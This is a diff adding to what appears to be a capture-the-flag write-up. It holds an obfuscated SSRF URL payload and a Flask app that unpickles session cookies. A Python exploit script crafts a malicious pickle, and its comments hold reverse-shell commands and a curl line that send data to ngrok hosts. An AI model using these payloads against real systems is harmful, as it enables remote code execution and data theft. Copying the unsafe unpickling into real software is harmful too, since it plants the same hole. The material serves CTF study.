@@ -192,3 +192,84 @@ FLAG:FLAG{gopher://http_post}
 ## SSRFrog
 
 url payload: `HTtp:ᵀhⒺ。c⓪Ｏ₀o⁰Ⓛ-fl⁴4④g｡sℰrvᴱᵣ.iⓝⓣeⓇnaᴸ`
+
+## Pickle
+
+server source code
+
+```python
+from flask import Flask, request, make_response, redirect, send_file
+import base64
+import pickle
+
+app = Flask(__name__)
+
+
+@app.route("/sauce")
+def sauce():
+    return send_file(__file__, mimetype="text/plain")
+
+
+@app.route("/")
+def main():
+    session = request.cookies.get("session")
+    if session == None:
+        return '<form action="/login" method="POST">' +\
+            '<p>Name: <input name="name" type="text"></p>' +\
+            '<p>Age: <input name="age" type="number"></p>' +\
+            '<button>Submit</button></form><hr><a href="/sauce">Source code</a>'
+
+    else:
+        user = pickle.loads(base64.b64decode(session))
+        return f'<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>'
+
+
+@app.route("/login", methods=['POST'])
+def login():
+    user = base64.b64encode(pickle.dumps({
+        "name": request.form.get('name'),
+        "age": int(request.form.get('age'))
+    }))
+    resp = make_response(redirect('/'))
+    resp.set_cookie("session", user)
+    return resp
+```
+
+Attack Script / Payload (Create a Reverse Shell)
+
+```python
+import pickle
+import os
+
+def Hello():
+    pass
+
+def Gedget2():
+    pass
+
+def Singleton():
+    Hello()
+    Gedget2()
+    Hello()
+
+payload = { "name": "Gotya Pwn", "age": 10}
+
+class Exploit(object):
+    def __reduce__(self):
+        # Reverse Shell & Data Exfiltration Payload
+        # return (os.system, ('bash -c "bash -i >& /dev/tcp/8.tcp.ngrok.io/14422 0>&1"',))
+        # return (os.system, ('curl "http://b771-140-113-229-111.ngrok.io/?test=$(ls / | tr \'\\r\\n\' \'|\')"',))
+        # return (os.system, ("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"4.tcp.ngrok.io\",18244));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",))
+        # return (dict, (payload, ))
+        Hello()
+        Gedget2()
+        Hello()
+
+        return (Singleton, ())
+
+
+serialized = pickle.dumps(Exploit())
+with open("exploit", "wb") as f:
+    f.write(serialized)
+    f.close()
+```
